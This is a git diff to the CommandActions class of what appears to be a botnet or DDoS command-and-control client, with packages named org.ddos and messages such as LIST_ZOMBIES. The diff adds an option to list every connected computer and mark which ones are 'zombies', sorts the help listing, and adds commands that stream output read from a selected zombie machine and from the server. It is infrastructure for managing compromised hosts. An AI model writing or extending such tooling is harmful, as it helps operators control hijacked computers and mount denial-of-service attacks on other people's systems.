@@ -8,10 +8,12 @@ import java.io.Serializable;
 import java.net.InetSocketAddress;
 import java.net.SocketAddress;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.regex.Pattern;
 
 import org.ddos.client.DOS;
 import org.ddos.network.ClientNetwork;
+import org.ddos.util.Computer;
 import org.ddos.util.Console;
 import org.jcom.Command;
 import org.jcom.CommandException;
@@ -101,16 +103,24 @@ public class CommandActions {
 		return new CommandJob() {
 			@Override
 			public Object doJob(Command command) {
+				boolean isAll = command.hasFlag("-a");
 				try {
-					ClientNetwork.getClient().getOutputStream()
-							.writeObject(new DataPackage().setMessage("LIST_ZOMBIES"));
+					if (isAll) {
+						ClientNetwork.getClient().getOutputStream()
+								.writeObject(new DataPackage().setMessage("LIST_ALL"));
+					} else {
+						ClientNetwork.getClient().getOutputStream()
+								.writeObject(new DataPackage().setMessage("LIST_ZOMBIES"));
+					}
 
-					SocketAddress[] addresses = (SocketAddress[]) ((DataPackage) ClientNetwork.getClient()
-							.getInputStream().readObject()).getObjects();
-					Console.println("There are " + addresses.length + " zombie(s) connected.");
+					Computer[] addresses = (Computer[]) ((DataPackage) ClientNetwork.getClient().getInputStream()
+							.readObject()).getObjects();
+					Console.println("There are " + addresses.length + " " + (isAll ? "computer(s)" : "zombie(s)")
+							+ " connected.");
 
-					for (SocketAddress address : addresses) {
-						Console.println(address);
+					for (Computer address : addresses) {
+						Console.println(address.getAddress()
+								+ (isAll ? (address.isZombie() ? " (zombie)" : " (computer)") : ""));
 					}
 
 					return addresses.length;
@@ -157,12 +167,9 @@ public class CommandActions {
 			public Object doJob(Command c) {
 				Console.println("Commands: ");
 
-				int largestCommandSize = 0;
-				for (String command : c.getInterface().getAllCommandsNames())
-					if (command.length() > largestCommandSize)
-						largestCommandSize = command.length();
-
-				for (String command : c.getInterface().getAllCommandsNames()) {
+				String[] commandNames = c.getInterface().getAllCommandsNames();
+				Arrays.sort(commandNames);
+				for (String command : commandNames) {
 					Console.println("\t" + command);
 				}
 				Console.println("Type \"help <command>\" for help with a specific command.");
@@ -323,6 +330,45 @@ public class CommandActions {
 					e.printStackTrace();
 				}
 				return false;
+			}
+		};
+	}
+
+	public static CommandJob getReadFromZombieAction() {
+		return new CommandJob() {
+			@Override
+			public Object doJob(Command command) {
+				try {
+					ClientNetwork.getClient().getOutputStream().writeObject(
+							new DataPackage(command.getCommandArguments()[0]).setMessage("START_READ_ZOMBIE"));
+
+					while (true) {
+						System.out.println(ClientNetwork.getClient().getInputStream().readObject());
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+				return null;
+			}
+		};
+	}
+
+	public static CommandJob getReadFromServerAction() {
+		return new CommandJob() {
+			@Override
+			public Object doJob(Command command) {
+				try {
+					ClientNetwork.getClient().getOutputStream()
+							.writeObject(new DataPackage().setMessage("START_READ_SERVER"));
+
+					while (true) {
+						System.out.println(((DataPackage) ClientNetwork.getClient().getInputStream().readObject())
+								.getObjects()[0]);
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+				return null;
 			}
 		};
 	}
